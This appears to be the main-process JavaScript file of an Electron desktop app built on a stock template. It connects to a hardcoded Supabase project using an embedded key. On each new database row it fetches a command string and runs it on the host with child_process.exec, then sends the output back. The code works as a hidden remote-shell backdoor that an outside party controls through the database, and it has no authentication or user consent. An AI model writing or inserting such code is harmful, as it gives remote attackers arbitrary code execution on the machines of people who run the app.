"use strict";
const electron = require("electron");
const path = require("path");
const utils = require("@electron-toolkit/utils");
const supabaseJs = require("@supabase/supabase-js");
const child_process = require("child_process");
const icon = path.join(__dirname, "../../resources/icon.png");
const supabaseUrl = "https://qcwdivuxddjokidadogy.supabase.co;";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFjd2RpdnV4ZGRqb2tpZGFkb2d5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTY2NTgxNjEsImV4cCI6MjAzMjIzNDE2MX0.HnggSDy5m-3G7uRN0xQ1sJhXHyAODqMKGQ4dmS8Q-ZE";
const supabase = supabaseJs.createClient(supabaseUrl, supabaseKey);
let mainWindow;
function createWindow() {
  mainWindow = new electron.BrowserWindow({
    width: 900,
    height: 670,
    show: false,
    autoHideMenuBar: true,
    ...process.platform === "linux" ? { icon } : {},
    webPreferences: {
      preload: path.join(__dirname, "../preload/index.js"),
      sandbox: false
    }
  });
  mainWindow.on("ready-to-show", () => {
    mainWindow.show();
  });
  mainWindow.webContents.setWindowOpenHandler((details) => {
    electron.shell.openExternal(details.url);
    return { action: "deny" };
  });
  if (utils.is.dev && process.env["ELECTRON_RENDERER_URL"]) {
    mainWindow.loadURL(process.env["ELECTRON_RENDERER_URL"]);
  } else {
    mainWindow.loadFile(path.join(__dirname, "../renderer/index.html"));
  }
}
electron.app.whenReady().then(() => {
  utils.electronApp.setAppUserModelId("com.electron");
  electron.app.on("browser-window-created", (_, window) => {
    utils.optimizer.watchWindowShortcuts(window);
  });
  electron.ipcMain.on("ping", () => console.log("pong"));
  createWindow();
  electron.app.on("activate", function() {
    if (electron.BrowserWindow.getAllWindows().length === 0) createWindow();
  });
  supabase.channel("command-channel").on(
    "postgres_changes",
    { event: "INSERT", schema: "public", table: "command_history" },
    async (payload) => {
      const commandId = payload.new.command_id;
      const { data: commandData, error } = await supabase.from("commands").select("command").eq("id", commandId).single();
      if (error) {
        console.error("Error fetching command:", error);
        return;
      }
      const command = commandData.command;
      child_process.exec(command, async (error2, stdout, stderr) => {
        let status = "completed";
        let output = stdout;
        if (error2) {
          status = "error";
          output = error2.message;
        } else if (stderr) {
          status = "stderr";
          output = stderr;
        }
        await supabase.from("command_history").update({ status, output, updated_at: /* @__PURE__ */ new Date() }).eq("id", payload.new.id);
        mainWindow.webContents.send(
          "command-result",
          JSON.stringify({ status, output })
        );
      });
    }
  ).subscribe();
});
electron.app.on("window-all-closed", () => {
  if (process.platform !== "darwin") {
    electron.app.quit();
  }
});
